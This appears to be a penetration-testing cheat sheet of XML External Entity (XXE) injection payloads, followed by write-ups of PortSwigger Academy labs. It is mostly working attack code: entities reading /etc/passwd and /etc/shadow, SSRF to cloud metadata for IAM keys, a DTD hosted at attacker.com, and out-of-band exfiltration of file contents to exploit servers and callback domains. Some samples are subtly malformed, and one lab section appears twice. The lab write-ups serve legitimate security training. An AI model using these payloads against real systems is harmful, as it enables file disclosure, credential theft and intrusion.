# ✅ **XML External Entity (XXE) Injection – Complete Test Case (with Bypass Cases)**

---

# **1. List of Vulnerabilities (XXE Attack Surface)**

* **1.1 Classic External Entity Injection**
  Loading external files via `<!ENTITY>`.

* **1.2 File Disclosure via XXE**
  Reading sensitive files such as `/etc/passwd`.

* **1.3 SSRF via XXE**
  Using XML parsers to send requests to internal services.

* **1.4 Blind XXE (Out-of-Band)**
  Exfiltrating data using DNS/HTTP callbacks.

* **1.5 Parameter Entity Expansion**
  Parser loads external entities inside attributes.

* **1.6 Billion Laughs (DoS)**
  Recursive entities causing memory exhaustion.

* **1.7 Schema / DTD Injection**
  Attacker injects malicious internal DTD references.

* **1.8 External DTD Fetching Bypass**
  With custom URIs, multi-encoding, or specially crafted payloads.

* **1.9 SVG, SOAP, DOCX, PDF XXE**
  XXE through XML-based file formats.

* **1.10 XXE → RCE (rare, chained)**
  When XML parser interacts with command-executing libraries.

---

# **2. Sample Payloads (Core Attack Payloads)**

(Simple, safe-to-read examples)

### **2.1 Basic XXE – File Read**

```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>
```

### **2.2 SSRF via XXE**

```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://127.0.0.1:80/">
]>
<root>&xxe;</root>
```

### **2.3 Blind XXE (DNS/HTTP Ping)**

```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://abc.your-callback-domain.com/">
]>
<data>&xxe;</data>
```

### **2.4 Billion Laughs (DoS Example)**

```xml
<!DOCTYPE lolz [
 <!ENTITY a "123">
 <!ENTITY b "&a;&a;">
 <!ENTITY c "&b;&b;">
]>
<data>&c;</data>
```

---

# **3. Bypass Payloads (Advanced Techniques)**

Used when the application blocks DTD or external entities.

### **3.1 Base64 Encoded File Read**

```xml
<!DOCTYPE foo [
  <!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
  <!ENTITY xxe "%data;">
]>
<root>&xxe;</root>
```

### **3.2 Parameter Entity Bypass**

```xml
<!DOCTYPE foo [
  <!ENTITY % p1 SYSTEM "file:///etc/passwd">
  <!ENTITY p2 "%p1;">
]>
<root>%p2;</root>
```

### **3.3 XXE in SOAP Envelope**

```xml
<?xml version="1.0"?>
<!DOCTYPE a [
  <!ENTITY xxe SYSTEM "file:///etc/shadow">
]>
<soap:Envelope>
  <data>&xxe;</data>
</soap:Envelope>
```

### **3.4 External DTD Bypass**

Hosted malicious DTD:

```xml
<!DOCTYPE foo SYSTEM "http://attacker.com/malicious.dtd">
<root>test</root>
```

`malicious.dtd`:

```xml
<!ENTITY % xxe SYSTEM "file:///etc/passwd">
<!ENTITY data "%xxe;">
```

### **3.5 Encoding Bypass**

```xml
<!DOCTYPE %25foo [
  <!ENTITY %25xxe SYSTEM "file:///etc/passwd">
]>
```

### **3.6 Numeric IP SSRF**

```
http://2130706433        (127.0.0.1 in decimal)
```

### **3.7 SVG File XXE**

```xml
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg>&xxe;</svg>
```

---

# **4. Updated With Realistic Testing Payloads (Advanced Learning)**

### **4.1 Real File Disclosure Payload**

```xml
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "/etc/hostname">
]>
<root>&xxe;</root>
```

### **4.2 AWS Metadata Access**

```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/">
]>
<root>&xxe;</root>
```

### **4.3 GitHub Enterprise (SSRF)**

```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://localhost:8080/api/v3/admin">
]>
<data>&xxe;</data>
```

### **4.4 Blind XXE with Burp Collaborator**

```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://x.your-collab.net">
]>
<ping>&xxe;</ping>
```

### **4.5 DOCX / PPTX XXE (word/document.xml)**

```xml
<!DOCTYPE r [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<w:p>&xxe;</w:p>
```

### **4.6 PDF XXE (XMP Section)**

```xml
<!DOCTYPE x [
  <!ENTITY xxe SYSTEM "file:///etc/hosts">
]>
<metadata>&xxe;</metadata>
```

---

# **5. Validation / Test Steps**

**Step 1:** Identify any XML-processing endpoint
→ SOAP, SAML, SVG upload, RSS feeds, XML APIs, PDF/DOCX processors.

**Step 2:** Send basic XXE — check for file content.
→ `/etc/passwd`, `/etc/hostname`.

**Step 3:** Attempt SSRF XXE
→ `127.0.0.1`, `169.254.169.254`.

**Step 4:** Try blind XXE / OOB
→ DNS/HTTP callbacks.

**Step 5:** Try bypass payloads
→ parameter entities, encoded DTD, external DTD hosting.

---

# **6. Expected Results / Impact**

* Sensitive file disclosure.
* SSRF into internal systems.
* Cloud metadata credentials leakage.
* Application crash due to DoS.
* Potential **RCE** when chained with unsafe parsers or libraries.

---

# Exploiting XXE using external entities to retrieve files

This lab has a "Check stock" feature that parses XML input and returns any unexpected values in the response.

To solve the lab, inject an XML external entity to retrieve the contents of the /etc/passwd file.

---------------------------------------------

References: 

- https://portswigger.net/web-security/xxe



![img](images/Exploiting%20XXE%20using%20external%20entities%20to%20retrieve%20files/1.png)

---------------------------------------------


The request to check the stcok of a product uses a XML object:



![img](images/Exploiting%20XXE%20using%20external%20entities%20to%20retrieve%20files/2.png)


Tha payload used is:

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck>
	<productId>
		&xxe;
	</productId>
	<storeId>
		1
	</storeId>
</stockCheck>
```



![img](images/Exploiting%20XXE%20using%20external%20entities%20to%20retrieve%20files/3.png)

# Exploiting XXE to perform SSRF attacks

This lab has a "Check stock" feature that parses XML input and returns any unexpected values in the response.

The lab server is running a (simulated) EC2 metadata endpoint at the default URL, which is http://169.254.169.254/. This endpoint can be used to retrieve data about the instance, some of which might be sensitive.

To solve the lab, exploit the XXE vulnerability to perform an SSRF attack that obtains the server's IAM secret access key from the EC2 metadata endpoint.

---------------------------------------------

References: 

- https://portswigger.net/web-security/xxe



![img](images/Exploiting%20XXE%20to%20perform%20SSRF%20attacks/1.png)

---------------------------------------------

Using the simple payload you get a value after invalid product, in this case “latest”:

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/"> ]>
<stockCheck>
	<productId>
		&xxe;
	</productId>
	<storeId>
		1
	</storeId>
</stockCheck>
```



![img](images/Exploiting%20XXE%20to%20perform%20SSRF%20attacks/2.png)


Adding this value to the url you end up with the following payload:

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]>
<stockCheck>
	<productId>
		&xxe;
	</productId>
	<storeId>
		1
	</storeId>
</stockCheck>
```



![img](images/Exploiting%20XXE%20to%20perform%20SSRF%20attacks/3.png)

# Blind XXE with out-of-band interaction

This lab has a "Check stock" feature that parses XML input but does not display the result.

You can detect the blind XXE vulnerability by triggering out-of-band interactions with an external domain.

To solve the lab, use an external entity to make the XML parser issue a DNS lookup and HTTP request to Burp Collaborator.

Note: To prevent the Academy platform being used to attack third parties, our firewall blocks interactions between the labs and arbitrary external systems. To solve the lab, you must use Burp Collaborator's default public server.

---------------------------------------------

References: 

- https://portswigger.net/web-security/xxe/blind



![img](images/Blind%20XXE%20with%20out-of-band%20interaction/1.png)

---------------------------------------------


Using the same payload as the last lab but changing the url for a Collaborator url we have this payload:

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://3vzysj2gzhhn64eedhoks71zjqphd71w.oastify.com"> ]>
<stockCheck>
	<productId>
		&xxe;
	</productId>
	<storeId>
		1
	</storeId>
</stockCheck>
```



![img](images/Blind%20XXE%20with%20out-of-band%20interaction/2.png)


And there are requests in the Collaborator tab:



![img](images/Blind%20XXE%20with%20out-of-band%20interaction/3.png)

# Blind XXE with out-of-band interaction via XML parameter entities

This lab has a "Check stock" feature that parses XML input, but does not display any unexpected values, and blocks requests containing regular external entities.

To solve the lab, use a parameter entity to make the XML parser issue a DNS lookup and HTTP request to Burp Collaborator.

Note: To prevent the Academy platform being used to attack third parties, our firewall blocks interactions between the labs and arbitrary external systems. To solve the lab, you must use Burp Collaborator's default public server.

---------------------------------------------

Reference: https://portswigger.net/web-security/xxe/blind

---------------------------------------------

Generated link: https://0a8300cf04a26be4802b0864005700e8.web-security-academy.net/

Original request:

```
<?xml version="1.0" encoding="UTF-8"?>
<stockCheck>
	<productId>
		1
	</productId>
	<storeId>
		1
	</storeId>
</stockCheck>
```

We want to add something like this example from the reference:

``` 
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://COLLABORATOR_URL"> %xxe; ]>
```

We will test the following payload:

```
<?xml version="1.0" encoding="UTF-8"?>
	<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://q6x580qbz3i8x9wutkq9i4bg97fy3ord.oastify.com"> %xxe; ]>		
	<stockCheck>
		<productId>
			1
		</productId>
		<storeId>
			1
		</storeId>
	</stockCheck>
```



![img](images/Blind%20XXE%20with%20out-of-band%20interaction%20via%20XML%20parameter%20entities/1.png)


We get requests in Burp Collaborator:



![img](images/Blind%20XXE%20with%20out-of-band%20interaction%20via%20XML%20parameter%20entities/2.png)

# Exploiting blind XXE to exfiltrate data using a malicious external DTD

This lab has a "Check stock" feature that parses XML input but does not display the result.

To solve the lab, exfiltrate the contents of the /etc/hostname file.

Note: To prevent the Academy platform being used to attack third parties, our firewall blocks interactions between the labs and arbitrary external systems. To solve the lab, you must use the provided exploit server and/or Burp Collaborator's default public server.

---------------------------------------------

References: 

- https://portswigger.net/web-security/xxe/blind



![img](images/Exploiting%20blind%20XXE%20to%20exfiltrate%20data%20using%20a%20malicious%20external%20DTD/1.png)

---------------------------------------------


First we store the malicious DTD in the exploit server:

```
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'https://exploit-0ad2004004843a168182a2f5018800b6.exploit-server.net/?x=%file;'>">
%eval;
%exfiltrate;
```



![img](images/Exploiting%20blind%20XXE%20to%20exfiltrate%20data%20using%20a%20malicious%20external%20DTD/2.png)


Then we send the XXE payload:

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://exploit-0ad2004004843a168182a2f5018800b6.exploit-server.net/malicious.dtd"> %xxe;]>
<stockCheck>
	<productId>
		&xxe;
	</productId>
	<storeId>
		1
	</storeId>
</stockCheck>
```



![img](images/Exploiting%20blind%20XXE%20to%20exfiltrate%20data%20using%20a%20malicious%20external%20DTD/3.png)


We get an error but the hostname is received:



![img](images/Exploiting%20blind%20XXE%20to%20exfiltrate%20data%20using%20a%20malicious%20external%20DTD/4.png)

# Exploiting blind XXE to retrieve data via error messages

This lab has a "Check stock" feature that parses XML input but does not display the result.

To solve the lab, use an external DTD to trigger an error message that displays the contents of the /etc/passwd file.

The lab contains a link to an exploit server on a different domain where you can host your malicious DTD.

---------------------------------------------

References: 

- https://portswigger.net/web-security/xxe/blind



![img](images/Exploiting%20blind%20XXE%20to%20retrieve%20data%20via%20error%20messages/1.png)

---------------------------------------------

First we store the malicious DTD in the exploit server:

```
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```



![img](images/Exploiting%20blind%20XXE%20to%20retrieve%20data%20via%20error%20messages/2.png)


Then we send the XXE payload:

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://exploit-0a89003a032db21e8245e131014c005d.exploit-server.net/malicious.dtd"> %xxe;]>
<stockCheck>
	<productId>
		1
	</productId>
	<storeId>
		1
	</storeId>
</stockCheck>
```




![img](images/Exploiting%20blind%20XXE%20to%20retrieve%20data%20via%20error%20messages/3.png)

# Exploiting XInclude to retrieve files

This lab has a "Check stock" feature that embeds the user input inside a server-side XML document that is subsequently parsed.

Because you don't control the entire XML document you can't define a DTD to launch a classic XXE attack.

To solve the lab, inject an XInclude statement to retrieve the contents of the /etc/passwd file.

Hint: By default, XInclude will try to parse the included document as XML. Since /etc/passwd isn't valid XML, you will need to add an extra attribute to the XInclude directive to change this behavior.


---------------------------------------------

References: 

- https://portswigger.net/web-security/xxe



![img](images/Exploiting%20XInclude%20to%20retrieve%20files/1.png)

---------------------------------------------

Initial payload:

```
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/passwd"/></foo>
```

Initial POST request:



![img](images/Exploiting%20XInclude%20to%20retrieve%20files/2.png)


It is possible to retieve the file's content URL-encoding the payload and sending it inside the “productId” parameter:

```
POST /product/stock HTTP/2
...

productId=<foo+xmlns%3axi%3d"http%3a//www.w3.org/2001/XInclude"><xi%3ainclude+parse%3d"text"+href%3d"file%3a///etc/passwd"/></foo>&storeId=1
```



![img](images/Exploiting%20XInclude%20to%20retrieve%20files/3.png)

# Exploiting XXE via image file upload

This lab lets users attach avatars to comments and uses the Apache Batik library to process avatar image files.

To solve the lab, upload an image that displays the contents of the /etc/hostname file after processing. Then use the "Submit solution" button to submit the value of the server hostname.

Hint: The SVG image format uses XML.


---------------------------------------------

References: 

- https://portswigger.net/web-security/xxe



![img](images/Exploiting%20XXE%20via%20image%20file%20upload/1.png)

---------------------------------------------




![img](images/Exploiting%20XXE%20via%20image%20file%20upload/2.png)


The avatar is sent within the comment:



![img](images/Exploiting%20XXE%20via%20image%20file%20upload/3.png)


We will change the "filename" to “test.svg” and the "Content-Type" to “image/svg+xml”, and then change the content to an XXE payload. 

First I tested if it is possible to generate an HTTP request to the Collaborator url:

```
-----------------------------39756462762517607865870849077
...
Content-Disposition: form-data; name="avatar"; filename="test.svg"
Content-Type: image/svg+xml

<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://w63x7veqbibnsmco4xvkaucwyn4es4gt.oastify.com"> ]><stockCheck><productId>&xxe;	</productId><storeId>1</storeId></stockCheck>
...
```



![img](images/Exploiting%20XXE%20via%20image%20file%20upload/4.png)


The server returns a 500 error code but the connections were generated:



![img](images/Exploiting%20XXE%20via%20image%20file%20upload/5.png)


And in the HTML response we can read this:



![img](images/Exploiting%20XXE%20via%20image%20file%20upload/6.png)


I got to this payload, which generates a 302 code and the comment is created in the post:

```
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/hostname"> ]><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1" height="200"><text font-size="16" x="0" y="16">&xxe;</text></svg>
```


And you can see the hostname ("81da8cd96d3a") in the image:



![img](images/Exploiting%20XXE%20via%20image%20file%20upload/7.png)

# 23 - Discovering vulnerabilities quickly with targeted scanning

This lab contains a vulnerability that enables you to read arbitrary files from the server. To solve the lab, retrieve the contents of /etc/passwd within 10 minutes.

Due to the tight time limit, we recommend using Burp Scanner to help you. You can obviously scan the entire site to identify the vulnerability, but this might not leave you enough time to solve the lab. Instead, use your intuition to identify endpoints that are likely to be vulnerable, then try running a targeted scan on a specific request. Once Burp Scanner has identified an attack vector, you can use your own expertise to find a way to exploit it.

Hint: If you get stuck, try looking up our Academy topic on the identified vulnerability class.


---------------------------------------------

References: 

- https://portswigger.net/web-security/essential-skills/using-burp-scanner-during-manual-testing

- https://portswigger.net/web-security/xxe



![img](images/Discovering%20vulnerabilities%20quickly%20with%20targeted%20scanning/1.png)

---------------------------------------------

Burp scanner finds this vulnerability:



![img](images/Discovering%20vulnerabilities%20quickly%20with%20targeted%20scanning/2.png)

We know this payload works:

```
<njd xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="http://itfjkky610emxm8w1amzh40dm4sygp4qsif83x.oastify.com/foo"/></njd>
```

So we will try:

```
<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>
```

The POST request will be:

```
POST /product/stock HTTP/2
...

productId=%3c%66%6f%6f%20%78%6d%6c%6e%73%3a%78%69%3d%22%68%74%74%70%3a%2f%2f%77%77%77%2e%77%33%2e%6f%72%67%2f%32%30%30%31%2f%58%49%6e%63%6c%75%64%65%22%3e%3c%78%69%3a%69%6e%63%6c%75%64%65%20%70%61%72%73%65%3d%22%74%65%78%74%22%20%68%72%65%66%3d%22%66%69%6c%65%3a%2f%2f%2f%65%74%63%2f%70%61%73%73%77%64%22%2f%3e%3c%2f%66%6f%6f%3e&storeId=1
```



![img](images/Discovering%20vulnerabilities%20quickly%20with%20targeted%20scanning/3.png)



![img](images/Discovering%20vulnerabilities%20quickly%20with%20targeted%20scanning/4.png)




![img](images/Exploiting%20XXE%20via%20image%20file%20upload/8.png)


# 7 - Blind XXE with out-of-band interaction via XML parameter entities

This lab has a "Check stock" feature that parses XML input, but does not display any unexpected values, and blocks requests containing regular external entities.

To solve the lab, use a parameter entity to make the XML parser issue a DNS lookup and HTTP request to Burp Collaborator.

Note: To prevent the Academy platform being used to attack third parties, our firewall blocks interactions between the labs and arbitrary external systems. To solve the lab, you must use Burp Collaborator's default public server.

---------------------------------------------

Reference: https://portswigger.net/web-security/xxe/blind

---------------------------------------------

Generated link: https://0a8300cf04a26be4802b0864005700e8.web-security-academy.net/

Original request:

```
<?xml version="1.0" encoding="UTF-8"?>
<stockCheck>
	<productId>
		1
	</productId>
	<storeId>
		1
	</storeId>
</stockCheck>
```

We want to add something like this example from the reference:

``` 
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://COLLABORATOR_URL"> %xxe; ]>
```

We will test the following payload:

```
<?xml version="1.0" encoding="UTF-8"?>
	<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://q6x580qbz3i8x9wutkq9i4bg97fy3ord.oastify.com"> %xxe; ]>		
	<stockCheck>
		<productId>
			1
		</productId>
		<storeId>
			1
		</storeId>
	</stockCheck>
```



![img](images/7%20-%20Blind%20XXE%20with%20out-of-band%20interaction%20via%20XML%20parameter%20entities/1.png)


We get requests in Burp Collaborator:



![img](images/7%20-%20Blind%20XXE%20with%20out-of-band%20interaction%20via%20XML%20parameter%20entities/2.png)
